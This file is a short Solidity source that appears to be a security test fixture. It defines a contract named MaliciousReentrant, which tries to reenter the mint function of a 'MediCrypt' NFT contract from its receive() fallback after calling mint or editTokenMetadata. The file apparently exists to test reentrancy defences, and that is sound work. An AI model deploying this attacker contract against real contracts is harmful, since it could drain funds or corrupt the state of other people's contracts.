// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

interface IMediCrypt {
    function mint(
        address ownerWalletAddress,
        string memory nftURI,
        string memory nftName,
        string memory encryptionKey
    ) external payable;

    function editTokenMetadata(
        uint256 tokenId,
        string memory nftURI,
        string memory nftName,
        string memory encryptionKey
    ) external payable;
}

contract MaliciousReentrant {
    IMediCrypt public target;
    bool public attacking = false;

    function attackMint(
        address targetContract,
        address ownerWalletAddress,
        string memory nftURI,
        string memory nftName,
        string memory encryptionKey
    ) external payable {
        target = IMediCrypt(targetContract);
        attacking = true;
        
        target.mint{value: msg.value}(
            ownerWalletAddress,
            nftURI,
            nftName,
            encryptionKey
        );
    }

    function attackEditMetadata(
        address targetContract,
        uint256 tokenId,
        string memory nftURI,
        string memory nftName,
        string memory encryptionKey
    ) external payable {
        target = IMediCrypt(targetContract);
        attacking = true;
        
        target.editTokenMetadata{value: msg.value}(
            tokenId,
            nftURI,
            nftName,
            encryptionKey
        );
    }

    // This function will be called when the contract receives Ether
    receive() external payable {
        if (attacking && address(target) != address(0)) {
            // Try to reenter
            target.mint{value: 0.000038 ether}(
                msg.sender,
                "malicious_uri",
                "malicious_name",
                "malicious_key"
            );
        }
    }
}
